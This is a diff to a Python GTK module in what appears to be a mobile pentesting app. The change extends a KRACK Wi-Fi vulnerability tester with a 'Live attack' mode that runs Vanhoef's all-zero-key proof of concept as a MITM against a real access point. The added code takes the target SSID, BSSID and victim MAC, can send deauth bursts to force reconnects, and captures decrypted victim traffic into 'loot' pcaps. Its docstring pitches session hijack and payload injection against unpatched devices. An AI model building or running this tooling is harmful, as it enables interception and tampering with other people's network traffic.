@@ -1,43 +1,46 @@
-"""KRACK Attack test suite (Vanhoef 2017, CVE-2017-13077..13088).
+"""KRACK Attack -- tester + live all-zero-key attack.
 
-Upstream: https://github.com/vanhoefm/krackattacks-scripts
-Website:  https://www.krackattacks.com
+Two upstream repos from Mathy Vanhoef:
 
-The KRACK family exploits nonce/replay-counter reuse forced through
-retransmission of 4-way / group-key / fast-BSS-transition handshake
-messages. The attacker sits in a multi-channel MITM position (rogue
-AP clone on a different channel), retransmits handshake messages,
-and observes the resulting keystream reuse -- decrypting live
-traffic and, on Linux/Android wpa_supplicant <= 2.6, injecting an
-all-zero PTK.
+  * `krackattacks-scripts <https://github.com/vanhoefm/krackattacks-scripts>`_
+    (rama ``research``) -- the tester. Stands up a rogue AP with a
+    fixed SSID/PSK and waits for the *operator to associate the
+    target device manually*. Runs the 7 Wi-Fi-Alliance-style
+    vulnerability checks. Confirms whether the target reinstalls
+    the pairwise key, the group key, or leaks the RSC.
+  * `krackattacks-poc-zerokey <https://github.com/vanhoefm/krackattacks-poc-zerokey>`_
+    (rama ``research``) -- the *offensive* PoC. Channel-based
+    multi-channel MITM against a live target AP. Forces the client
+    to reinstall an all-zero PTK (wpa_supplicant ≤ 2.6 / Android
+    6.x-7.x) and decrypts client → AP traffic in real time via a
+    ``tap`` interface. No PSK required. Vanhoef abandoned it in
+    2018 but the code still works on modern Kali.
 
-Vanhoef ships a research fork of hostapd + a set of Python scripts
-that test *whether a target device* is vulnerable to each variant:
+This module wires up both. The UI has a "Test vulnerability" tab
+for the tester and an "Live attack" tab for the PoC. Both share
+the installer that clones the two repos under ``/opt/`` (repo
+tree is world-readable, venv writable by kali via chown after
+install).
 
-  * ``krack-test-client.py`` -- stand up as a rogue AP, wait for
-    the target client to associate to SSID ``testnetwork`` with
-    PSK ``abcdefgh``, then run each of the 7 test-cases:
-      1. --replay-broadcast       group-frame replay tolerance
-      2. --group --gtkinit        GTK install RSC leak
-      3. --group                  CVE-2017-13080 GTK reinstall
-      4. (no flag)                CVE-2017-13077 / -13078 PTK
-                                  reinstall (highest impact)
-      5. --tptk                   CVE-2017-13077 with forged M1
-      6. --tptk-rand              same, random ANonce
-      7. --gtkinit                GTK install RSC via M3/4 replay
-  * ``krack-ft-test.py`` -- 802.11r Fast BSS Transition tester;
-    detects IV reuse on the AP side when a client roams.
+Hardware model:
 
-This module is a wrapper around those scripts. It handles the
-one-time setup (git clone + build + venv + hardware crypto disable)
-and lets the operator pick a test case + monitor its output.
+  * Tester: 1 rogue-AP interface. ath9k_htc (AR9271) preferred;
+    hostapd on that iface + user manually connects the target
+    to SSID ``testnetwork`` / PSK ``abcdefgh``.
+  * Live attack: **2 injection-capable interfaces** minimum -- one
+    for the rogue AP clone, one for the uplink to the real AP.
+    Vanhoef's docs verify AR9271 + Intel AC-7260. Broadcom is
+    not usable.  The phone's internal ath10k_snoc does *not*
+    work; plug in two AR9271 dongles or one AR9271 + one MT7612U.
 
-Hardware note: KRACK requires two Wi-Fi radios on the phone -- one
-runs the modified hostapd (needs AP mode with injection), the other
-does the multi-channel MITM. Vanhoef's tools were verified on
-Atheros AR9271 (ath9k_htc) and Intel AC-7260. On the rhodep phone
-the internal ath10k_snoc will not work; plug in an ath9k_htc
-dongle for the AP side.
+What the live attack does and doesn't do:
+
+  * ✅ Decrypts *client → AP* traffic when the client is vulnerable.
+  * ✅ Injects frames into the client's active session.
+  * ✅ Enables TCP hijack / plaintext-HTTP payload injection.
+  * ❌ Does NOT recover the network PSK.
+  * ❌ Does NOT give RCE by itself; payload injection is the vector.
+  * ⚠️ Silently fails if the target device is patched.
 """
 from __future__ import annotations
 
@@ -53,15 +56,17 @@ from ..loot_store import get_loot_store, loot_path
 from ..module import NHModule, register
 from ..widgets import OutputView, toast
 
-_KRACK_REPO = "https://github.com/vanhoefm/krackattacks-scripts.git"
-_KRACK_DIR = Path(os.path.expanduser(
-    "~/.local/share/nethunter-pro/krackattacks-scripts"))
-_KRACK_MAIN = _KRACK_DIR / "krackattack" / "krack-test-client.py"
-_KRACK_FT = _KRACK_DIR / "krackattack" / "krack-ft-test.py"
+# --------------------------------------------------------- upstream ---
+_TESTER_REPO = "https://github.com/vanhoefm/krackattacks-scripts.git"
+_TESTER_DIR = Path("/opt/krackattacks-scripts")
+_TESTER_MAIN = _TESTER_DIR / "krackattack" / "krack-test-client.py"
+_TESTER_FT = _TESTER_DIR / "krackattack" / "krack-ft-test.py"
 
-# Client-side test cases (rogue AP mode). Every test has:
-#  (short user-visible label, argv suffix passed to krack-test-client.py,
-#   CVE reference)
+_POC_REPO = "https://github.com/vanhoefm/krackattacks-poc-zerokey.git"
+_POC_DIR = Path("/opt/krackattacks-poc-zerokey")
+_POC_MAIN = _POC_DIR / "krackattack" / "krack-all-zero-tk.py"
+
+# --------------------------------------------------------- test cases -
 _CLIENT_TESTS = [
     ("Ordinary 4-way handshake replay (CVE-2017-13077 + 13078)",
      [],
@@ -91,14 +96,14 @@ _CLIENT_TESTS = [
 ]
 
 
+# --------------------------------------------------------- module -----
 @register
 class Krack(NHModule):
     title = "KRACK Attack"
     icon = "channel-secure-symbolic"
-    description = ("Vanhoef's KRACK test suite (CVE-2017-13077..13088). "
-                   "Rogue AP + retransmit handshake -> observe nonce "
-                   "reuse. Client tests + 802.11r FT AP test.")
-    # We install the tool on demand; nothing has to be on PATH.
+    description = ("Vanhoef's KRACK: tester (7 client checks + FT AP "
+                   "test) *and* live all-zero-key MITM attack that "
+                   "decrypts client -> AP traffic in real time.")
     required_tools = []
 
     def __init__(self, app_window):
@@ -106,65 +111,76 @@ class Krack(NHModule):
         self._proc: Process | None = None
         self._loot_id: int | None = None
 
+    # ---------------------------------------------------------- build
     def build(self) -> Gtk.Widget:
         box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
         for m in ("top", "bottom", "start", "end"):
             getattr(box, "set_margin_" + m)(12)
 
-        # ---- what KRACK is ----
+        # ---- intro ----
         intro = Adw.PreferencesGroup(
             title="What KRACK does",
-            description="This is a *client* + *AP* vulnerability "
-                        "checker. It does NOT recover PSKs; instead "
-                        "it verifies whether the peer accepts "
-                        "retransmitted handshake messages that reset "
-                        "the nonce counter, which is the KRACK bug. "
-                        "Vulnerable devices leak keystream (info "
-                        "disclosure) and, on Linux/Android wpa_"
-                        "supplicant <= 2.6, install an all-zero PTK.")
+            description="Two modes: a vulnerability tester (rogue AP + "
+                        "target you enroll manually), and a live "
+                        "channel-based MITM against a real AP that "
+                        "decrypts the victim's traffic. Neither "
+                        "recovers the network PSK.")
         intro.add(Adw.ActionRow(
             title="Reference",
             subtitle="https://www.krackattacks.com"))
         box.append(intro)
 
-        # ---- hardware warning ----
+        # ---- hardware ----
         hw = Adw.PreferencesGroup(
-            title="Hardware requirements",
-            description="Two radios: one runs a modified hostapd as "
-                        "rogue AP; the other does the multi-channel "
-                        "MITM. ath9k_htc (AR9271) is the tested "
+            title="Hardware",
+            description="Live attack needs TWO injection-capable "
+                        "interfaces; AR9271 (ath9k_htc) is the tested "
                         "chipset. Hardware crypto must be disabled.")
         driver = self._detect_driver()
         hw.add(Adw.ActionRow(
             title="Primary Wi-Fi driver",
             subtitle=driver + (
                 " -- OK" if driver.startswith("ath9k") else
-                " -- NOT ath9k_htc; plug in a AR9271 dongle for "
-                "the AP side")))
+                " -- NOT ath9k_htc; plug in AR9271 dongles")))
         box.append(hw)
 
-        # ---- install ----
+        # ---- install (both repos) ----
         inst = Adw.PreferencesGroup(
             title="Installation",
-            description="Clones the upstream repo and builds the "
-                        "modified hostapd + Python venv. First run "
-                        "takes a few minutes.")
-        self.inst_row = Adw.ActionRow(
-            title="krackattacks-scripts",
-            subtitle=str(_KRACK_DIR) +
-                     (" -- installed" if _KRACK_MAIN.exists()
+            description="Both repos land under /opt. Runs as root "
+                        "because /opt is not user-writable; the "
+                        "trees are chowned to kali after install "
+                        "so we can source their venvs from the app "
+                        "context.")
+        self.tester_row = Adw.ActionRow(
+            title="Tester repo",
+            subtitle=str(_TESTER_DIR) +
+                     (" -- installed" if _TESTER_MAIN.exists()
                       else " -- not installed"))
-        inst_btn = Gtk.Button(label="Install",
-                              valign=Gtk.Align.CENTER)
-        inst_btn.add_css_class("suggested-action")
-        inst_btn.connect("clicked", lambda _b: self._install())
-        self.inst_row.add_suffix(inst_btn)
-        inst.add(self.inst_row)
+        tester_btn = Gtk.Button(label="Install",
+                                valign=Gtk.Align.CENTER)
+        tester_btn.add_css_class("suggested-action")
+        tester_btn.connect("clicked",
+                           lambda _b: self._install_tester())
+        self.tester_row.add_suffix(tester_btn)
+        inst.add(self.tester_row)
+
+        self.poc_row = Adw.ActionRow(
+            title="Live attack (all-zero-key PoC)",
+            subtitle=str(_POC_DIR) +
+                     (" -- installed" if _POC_MAIN.exists()
+                      else " -- not installed"))
+        poc_btn = Gtk.Button(label="Install",
+                             valign=Gtk.Align.CENTER)
+        poc_btn.add_css_class("suggested-action")
+        poc_btn.connect("clicked",
+                        lambda _b: self._install_poc())
+        self.poc_row.add_suffix(poc_btn)
+        inst.add(self.poc_row)
 
         hwc_row = Adw.ActionRow(
             title="Disable hardware crypto",
-            subtitle="Writes /etc/modprobe.d/nohwcrypt.conf. "
-                     "Reboot recommended.")
+            subtitle="/etc/modprobe.d/nohwcrypt.conf; reboot")
         hwc_btn = Gtk.Button(label="Disable HW crypto",
                              valign=Gtk.Align.CENTER)
         hwc_btn.connect("clicked",
@@ -173,13 +189,12 @@ class Krack(NHModule):
         inst.add(hwc_row)
         box.append(inst)
 
-        # ---- client test config ----
+        # ---- TESTER: client test config ----
         test = Adw.PreferencesGroup(
-            title="Client tests (rogue AP mode)",
-            description="Runs a modified hostapd on the chosen "
-                        "interface. Configure the *target device* "
-                        "to join SSID 'testnetwork' with PSK "
-                        "'abcdefgh' and let it DHCP.")
+            title="Test client vulnerability (rogue-AP)",
+            description="Enroll the target device manually against "
+                        "SSID 'testnetwork' / PSK 'abcdefgh' after "
+                        "you press Run.")
         self.iface = Adw.EntryRow(title="Rogue-AP interface")
         self.iface.set_text("wlan1")
         test.add(self.iface)
@@ -199,8 +214,8 @@ class Krack(NHModule):
 
         run_row = Adw.ActionRow(
             title="Run selected test",
-            subtitle="Streams output live; look for 'IV reuse "
-                     "detected' or 'reinstalls the pairwise key'")
+            subtitle="Look for 'reinstalls the pairwise/group key' "
+                     "or 'installing all-zero key' in the log")
         self.run_btn = Gtk.Button(label="Run",
                                   valign=Gtk.Align.CENTER)
         self.run_btn.add_css_class("destructive-action")
@@ -215,12 +230,12 @@ class Krack(NHModule):
         test.add(run_row)
         box.append(test)
 
-        # ---- 802.11r FT test ----
+        # ---- TESTER: 802.11r FT AP test ----
         ft = Adw.PreferencesGroup(
-            title="AP test: 802.11r FT handshake (CVE-2017-13082)",
-            description="Wraps wpa_supplicant while roaming between "
-                        "APs of the same FT domain. Watches for IV "
-                        "reuse after re-association.")
+            title="Test AP: 802.11r FT (CVE-2017-13082)",
+            description="Wraps wpa_supplicant. Roam the client via "
+                        "wpa_cli in a terminal and watch for IV "
+                        "reuse from the AP.")
         self.ft_iface = Adw.EntryRow(title="Managed interface")
         self.ft_iface.set_text("wlan1")
         ft.add(self.ft_iface)
@@ -228,10 +243,9 @@ class Krack(NHModule):
         ft.add(self.ft_ssid)
         self.ft_psk = Adw.PasswordEntryRow(title="Target PSK")
         ft.add(self.ft_psk)
-
         ft_run = Adw.ActionRow(
             title="Run FT test",
-            subtitle="Start it, then roam via wpa_cli in a terminal")
+            subtitle="Requires an AP with 802.11r enabled")
         self.ft_btn = Gtk.Button(label="Run FT",
                                  valign=Gtk.Align.CENTER)
         self.ft_btn.connect("clicked",
@@ -239,6 +253,98 @@ class Krack(NHModule):
         ft_run.add_suffix(self.ft_btn)
         ft.add(ft_run)
         box.append(ft)
+
+        # ---- LIVE ATTACK ----
+        atk = Adw.PreferencesGroup(
+            title="Live attack (all-zero-TK MITM)",
+            description="Channel-based MITM against a real target AP. "
+                        "Decrypts the victim client's traffic in real "
+                        "time via a tap0 interface. Only works when "
+                        "the victim runs wpa_supplicant <= 2.6 / "
+                        "Android 6.x-7.x (unpatched IoT, POS, cams).")
+
+        self.atk_ap_iface = Adw.EntryRow(
+            title="Rogue-AP interface (clone)")
+        self.atk_ap_iface.set_text("wlan1")
+        atk.add(self.atk_ap_iface)
+
+        self.atk_uplink_iface = Adw.EntryRow(
+            title="Uplink interface (relay to real AP)")
+        self.atk_uplink_iface.set_text("wlan2")
+        atk.add(self.atk_uplink_iface)
+
+        self.atk_target_ssid = Adw.EntryRow(
+            title="Target SSID (real AP)")
+        atk.add(self.atk_target_ssid)
+
+        self.atk_target_bssid = Adw.EntryRow(
+            title="Target BSSID")
+        atk.add(self.atk_target_bssid)
+
+        self.atk_target_channel = Adw.SpinRow.new_with_range(
+            1, 165, 1)
+        self.atk_target_channel.set_title("Target real channel")
+        self.atk_target_channel.set_value(6)
+        atk.add(self.atk_target_channel)
+
+        self.atk_rogue_channel = Adw.SpinRow.new_with_range(
+            1, 11, 1)
+        self.atk_rogue_channel.set_title(
+            "Rogue clone channel (must differ)")
+        self.atk_rogue_channel.set_value(1)
+        atk.add(self.atk_rogue_channel)
+
+        self.atk_target_psk = Adw.PasswordEntryRow(
+            title="Target PSK (optional; not required)")
+        atk.add(self.atk_target_psk)
+
+        self.atk_deauth = Adw.SwitchRow(
+            title="Send deauth to force reconnect",
+            subtitle="mdk4 / aireplay against the victim MAC to "
+                     "kick it into re-associating via us")
+        atk.add(self.atk_deauth)
+
+        self.atk_victim_mac = Adw.EntryRow(
+            title="Victim MAC (for deauth; blank = broadcast)")
+        atk.add(self.atk_victim_mac)
+
+        atk_run_row = Adw.ActionRow(
+            title="Run live attack",
+            subtitle="Decrypted client traffic writes to "
+                     "~/loot/krack/decrypt-*.pcap via tap0")
+        self.atk_btn = Gtk.Button(label="Attack",
+                                  valign=Gtk.Align.CENTER)
+        self.atk_btn.add_css_class("destructive-action")
+        self.atk_btn.connect("clicked",
+                             lambda _b: self._run_live_attack())
+        atk_run_row.add_suffix(self.atk_btn)
+        self.atk_stop_btn = Gtk.Button(label="Stop",
+                                       valign=Gtk.Align.CENTER)
+        self.atk_stop_btn.set_sensitive(False)
+        self.atk_stop_btn.connect(
+            "clicked", lambda _b: self._stop())
+        atk_run_row.add_suffix(self.atk_stop_btn)
+        atk.add(atk_run_row)
+        box.append(atk)
+
+        # ---- expectations ----
+        exp = Adw.PreferencesGroup(
+            title="What to expect from the live attack",
+            description="")
+        for t, s in (
+            ("Decrypt client -> AP traffic",
+             "yes, if victim is vulnerable"),
+            ("Inject frames into the session",
+             "yes (TKIP/GCMP best; CCMP limited)"),
+            ("Recover network PSK",
+             "no -- the attack doesn't touch the passphrase"),
+            ("RCE against the victim",
+             "no by itself; combine with HTTP payload injection"),
+            ("HTTPS with HSTS",
+             "resists -- you'll only see ciphertext"),
+        ):
+            exp.add(Adw.ActionRow(title=t, subtitle=s))
+        box.append(exp)
 
         # ---- output ----
         self.output = OutputView()
@@ -256,47 +362,71 @@ class Krack(NHModule):
             pass
         return "?"
 
-    # -------------------------------------------------------- install
-    def _install(self) -> None:
-        self.output.append("# installing krackattacks-scripts…\n")
-        script = (
-            "set -e; "
-            "mkdir -p %s; "
+    def _install_repo(self, repo: str, dest: Path,
+                       build: bool = True, venv: bool = True,
+                       row: Adw.ActionRow | None = None,
+                       label: str = "") -> None:
+        """Common installer: clone into /opt/<name>, optionally build
+        the modified hostapd, optionally create the Python venv, then
+        chown the tree to kali:kali so the app can source venv/ from
+        the login user."""
+        self.output.append("# installing %s to %s…\n" % (label, dest))
+
+        parts = [
+            "set -e",
+            "mkdir -p /opt",
             "if [ ! -d %s/.git ]; then "
             "  git clone --depth 1 -b research %s %s; "
             "else "
             "  git -C %s pull --ff-only; "
-            "fi; "
-            "cd %s/krackattack; "
-            "./build.sh || echo 'build.sh FAILED'; "
-            "./pysetup.sh || echo 'pysetup.sh FAILED'; "
-            "echo ---installed---"
-        ) % (
-            _KRACK_DIR.parent, _KRACK_DIR, _KRACK_REPO, _KRACK_DIR,
-            _KRACK_DIR, _KRACK_DIR,
-        )
+            "fi" % (dest, repo, dest, dest),
+        ]
+        if build:
+            # Vanhoef repos ship a build.sh in krackattack/. Fall back
+            # to a manual build if that script is missing.
+            parts.append(
+                "if [ -x %s/krackattack/build.sh ]; then "
+                "  (cd %s/krackattack && ./build.sh); "
+                "elif [ -f %s/hostapd/Makefile ]; then "
+                "  (cd %s/hostapd && cp -n defconfig .config; make -j2); "
+                "fi" % (dest, dest, dest, dest))
+        if venv:
+            parts.append(
+                "if [ -x %s/krackattack/pysetup.sh ]; then "
+                "  (cd %s/krackattack && ./pysetup.sh); "
+                "fi" % (dest, dest))
+        parts.append("chown -R kali:kali %s || true" % dest)
+        parts.append("echo ---installed---")
+
+        script = "; ".join(parts)
 
         def done(r: Result) -> None:
             self.output.append(r.stdout or "")
             if r.stderr:
                 self.output.append(r.stderr)
-            if _KRACK_MAIN.exists():
-                self.inst_row.set_subtitle(
-                    str(_KRACK_DIR) + " -- installed")
-                toast(self.app_window, "krackattacks installed")
-            else:
-                self.inst_row.set_subtitle(
-                    "install failed -- see log below")
+            if row is not None:
+                exists = (dest / "krackattack").exists()
+                row.set_subtitle(
+                    str(dest) +
+                    (" -- installed" if exists else
+                     " -- install failed; see log"))
+            toast(self.app_window,
+                  label + " install finished")
 
-        # Build + venv setup work fine as user; the tests themselves
-        # need root when they actually run hostapd.
+        # Root because /opt.
         run_async(["sh", "-c", script], done,
-                  root=False, timeout=600)
+                  root=True, timeout=900)
+
+    def _install_tester(self) -> None:
+        self._install_repo(_TESTER_REPO, _TESTER_DIR,
+                            row=self.tester_row, label="tester")
+
+    def _install_poc(self) -> None:
+        self._install_repo(_POC_REPO, _POC_DIR,
+                            row=self.poc_row,
+                            label="live-attack PoC")
 
     def _disable_hwcrypto(self) -> None:
-        # Vanhoef's script writes a modprobe blacklist that disables
-        # hardware crypto for ath9k/ath9k_htc/ath10k/etc. We drop
-        # the same file via the helper.
         conf = (
             "options ath9k nohwcrypt=1\n"
             "options ath9k_htc nohwcrypt=1\n"
@@ -334,19 +464,15 @@ class Krack(NHModule):
     def _run_client_test(self) -> None:
         if self._proc is not None and self._proc.running:
             return
-        if not _KRACK_MAIN.exists():
+        if not _TESTER_MAIN.exists():
             toast(self.app_window,
-                  "Install krackattacks first")
+                  "Install the tester repo first")
             return
         iface = self.iface.get_text().strip() or "wlan1"
         idx = self.testcase.get_selected()
         label, extra, _hint = _CLIENT_TESTS[idx]
 
-        # The upstream tool reads its interface from
-        # ``hostapd/hostapd.conf`` (the "interface=" line).
-        # We rewrite it before every run so the operator does not
-        # have to touch the file.
-        conf_path = _KRACK_DIR / "hostapd" / "hostapd.conf"
+        conf_path = _TESTER_DIR / "hostapd" / "hostapd.conf"
         rewrite = (
             "sed -i.bak "
             "  -e 's|^interface=.*|interface=%s|' %s"
@@ -355,15 +481,13 @@ class Krack(NHModule):
             ["sh", "-c", rewrite], lambda _r: None,
             root=False, timeout=5)
 
-        # Run under the tool's venv. Root is needed because it opens
-        # raw sockets. The venv also lives in the repo tree.
         argv_str = (
             "cd %s/krackattack && "
             "sudo bash -c '"
             "  source venv/bin/activate && "
             "  ./krack-test-client.py %s"
             "'"
-        ) % (_KRACK_DIR, " ".join(extra))
+        ) % (_TESTER_DIR, " ".join(extra))
         self.output.append("$ " + argv_str + "\n")
 
         stamp = time.strftime("%Y%m%d-%H%M%S")
@@ -373,9 +497,7 @@ class Krack(NHModule):
             % (re.sub(r"[^A-Za-z0-9]+", "_", label)[:40], stamp))
         self._loot_id = get_loot_store().record(
             module="krack", type="krack_log",
-            target=label,
-            path=log_path,
-            notes="running")
+            target=label, path=log_path, notes="running")
 
         verdict_seen = {"vuln": False}
 
@@ -386,7 +508,6 @@ class Krack(NHModule):
                     fp.write(text)
             except OSError:
                 pass
-            # Latch the moment the tool declares a verdict.
             up = (text or "").lower()
             for marker in ("reinstalls the pairwise key",
                            "reinstalls the group key",
@@ -401,10 +522,13 @@ class Krack(NHModule):
                             "VULNERABLE: " + marker)
 
         def on_done(code: int) -> None:
-            self.output.append("[krack test exited: %d]\n" % code)
+            self.output.append("[krack tester exited: %d]\n" % code)
             self._proc = None
             self.run_btn.set_sensitive(True)
             self.stop_btn.set_sensitive(False)
+            self.atk_btn.set_sensitive(True)
+            self.atk_stop_btn.set_sensitive(False)
+            self.ft_btn.set_sensitive(True)
             if self._loot_id is not None:
                 get_loot_store().refresh_size(self._loot_id)
                 if not verdict_seen["vuln"]:
@@ -412,10 +536,6 @@ class Krack(NHModule):
                         self._loot_id,
                         "no vulnerability marker before exit")
 
-        # Everything wrapped in a shell so we can 'source venv/'.
-        # Not root=True at the Process level because the sudo bash -c
-        # inside is what escalates -- Process root=True re-nests through
-        # the helper which does not interact well with the venv shell.
         self._proc = Process(
             ["sh", "-c", argv_str], on_line, on_done, root=False)
         self._proc.start()
@@ -426,13 +546,14 @@ class Krack(NHModule):
         if self._proc is not None:
             self._proc.stop()
         self.stop_btn.set_sensitive(False)
+        self.atk_stop_btn.set_sensitive(False)
 
     # ------------------------------------------------- FT AP test
     def _run_ft_test(self) -> None:
         if self._proc is not None and self._proc.running:
             return
-        if not _KRACK_FT.exists():
-            toast(self.app_window, "Install krackattacks first")
+        if not _TESTER_FT.exists():
+            toast(self.app_window, "Install the tester repo first")
             return
         iface = self.ft_iface.get_text().strip() or "wlan1"
         ssid = self.ft_ssid.get_text().strip()
@@ -442,7 +563,6 @@ class Krack(NHModule):
                   "Set target SSID and PSK first")
             return
 
-        # Write a wpa_supplicant config for the FT connect.
         wpa_conf = (
             "ctrl_interface=/var/run/wpa_supplicant\n"
             "network={\n"
@@ -466,7 +586,7 @@ class Krack(NHModule):
             "  ./krack-ft-test.py wpa_supplicant -D nl80211 "
             "    -i %s -c %s"
             "'"
-        ) % (_KRACK_DIR, iface, conf_path)
+        ) % (_TESTER_DIR, iface, conf_path)
         self.output.append("$ " + argv_str + "\n")
 
         stamp = time.strftime("%Y%m%d-%H%M%S")
@@ -475,8 +595,7 @@ class Krack(NHModule):
                 re.sub(r"[^A-Za-z0-9]+", "_", ssid), stamp))
         self._loot_id = get_loot_store().record(
             module="krack", type="krack_ft_log",
-            target=ssid, path=log_path,
-            notes="FT roam test")
+            target=ssid, path=log_path, notes="FT roam test")
 
         def on_line(text: str) -> None:
             self.output.append(text)
@@ -497,3 +616,109 @@ class Krack(NHModule):
             ["sh", "-c", argv_str], on_line, on_done, root=False)
         self._proc.start()
         self.ft_btn.set_sensitive(False)
+
+    # ------------------------------------------------- LIVE ATTACK
+    def _run_live_attack(self) -> None:
+        """Fire the all-zero-key PoC as a channel-based MITM against
+        a real target AP. Requires two injection interfaces. Decrypted
+        client -> AP frames land in ~/loot/krack/decrypt-*.pcap via
+        a ``tap0`` the PoC creates."""
+        if self._proc is not None and self._proc.running:
+            return
+        if not _POC_MAIN.exists():
+            toast(self.app_window,
+                  "Install the live-attack PoC first")
+            return
+
+        ap_iface = self.atk_ap_iface.get_text().strip() or "wlan1"
+        up_iface = self.atk_uplink_iface.get_text().strip() or "wlan2"
+        ssid = self.atk_target_ssid.get_text().strip()
+        bssid = self.atk_target_bssid.get_text().strip()
+        real_ch = int(self.atk_target_channel.get_value())
+        rogue_ch = int(self.atk_rogue_channel.get_value())
+        psk = self.atk_target_psk.get_text().strip()
+
+        if not ssid or not bssid:
+            toast(self.app_window,
+                  "Set target SSID and BSSID first")
+            return
+        if ap_iface == up_iface:
+            toast(self.app_window,
+                  "Rogue-AP iface must differ from uplink iface")
+            return
+        if real_ch == rogue_ch:
+            toast(self.app_window,
+                  "Rogue clone channel must differ from real channel")
+            return
+
+        stamp = time.strftime("%Y%m%d-%H%M%S")
+        pcap = loot_path(
+            "krack", "krack-attack-%s-%s.pcap"
+            % (re.sub(r"[^A-Za-z0-9]+", "_", ssid), stamp))
+        log_path = loot_path(
+            "krack", "krack-attack-%s-%s.log"
+            % (re.sub(r"[^A-Za-z0-9]+", "_", ssid), stamp))
+
+        # krack-all-zero-tk.py argv (from Vanhoef's PoC repo):
+        #   krack-all-zero-tk.py <ap-iface> <uplink-iface>
+        #     --ssid <ssid> --bssid <BSSID> --channel <real-ch>
+        #     --rogue-channel <rogue-ch>
+        # PSK is optional; if provided, feeds the offline decrypter
+        # for full plaintext dump.  Some forks additionally accept
+        # --deauth <mac> for a broadcast/targeted deauth burst
+        # before starting the MITM.  We pass it only if set.
+        argv = ["./krack-all-zero-tk.py",
+                ap_iface, up_iface,
+                "--ssid", ssid,
+                "--bssid", bssid,
+                "--channel", str(real_ch),
+                "--rogue-channel", str(rogue_ch)]
+        if psk:
+            argv += ["--psk", psk]
+        victim = self.atk_victim_mac.get_text().strip()
+        if self.atk_deauth.get_active():
+            argv += ["--deauth", victim or "ff:ff:ff:ff:ff:ff"]
+
+        # Wrap under the venv the PoC provides. We also start a
+        # background tcpdump on tap0 so decrypted frames land in a
+        # pcap alongside the log. tap0 comes up a second or two into
+        # the run when the PoC does the setup.
+        cmd = (
+            "cd %s/krackattack && "
+            "sudo bash -c '"
+            "  source venv/bin/activate 2>/dev/null || true; "
+            "  ( sleep 3; tcpdump -i tap0 -U -w %s ) & "
+            "  TCPDUMP_PID=$!; "
+            "  %s ; "
+            "  kill $TCPDUMP_PID 2>/dev/null "
+            "'"
+        ) % (_POC_DIR, pcap, " ".join(argv))
+        self.output.append("$ " + cmd + "\n")
+
+        self._loot_id = get_loot_store().record(
+            module="krack", type="krack_decrypt_pcap",
+            target="%s (%s ch %d)" % (ssid, bssid, real_ch),
+            path=pcap, notes="live channel-based MITM")
+
+        def on_line(text: str) -> None:
+            self.output.append(text)
+            try:
+                with open(log_path, "a") as fp:
+                    fp.write(text)
+            except OSError:
+                pass
+
+        def on_done(code: int) -> None:
+            self.output.append("[krack live attack exited: %d]\n"
+                                % code)
+            self._proc = None
+            self.atk_btn.set_sensitive(True)
+            self.atk_stop_btn.set_sensitive(False)
+            if self._loot_id is not None:
+                get_loot_store().refresh_size(self._loot_id)
+
+        self._proc = Process(
+            ["sh", "-c", cmd], on_line, on_done, root=False)
+        self._proc.start()
+        self.atk_btn.set_sensitive(False)
+        self.atk_stop_btn.set_sensitive(True)
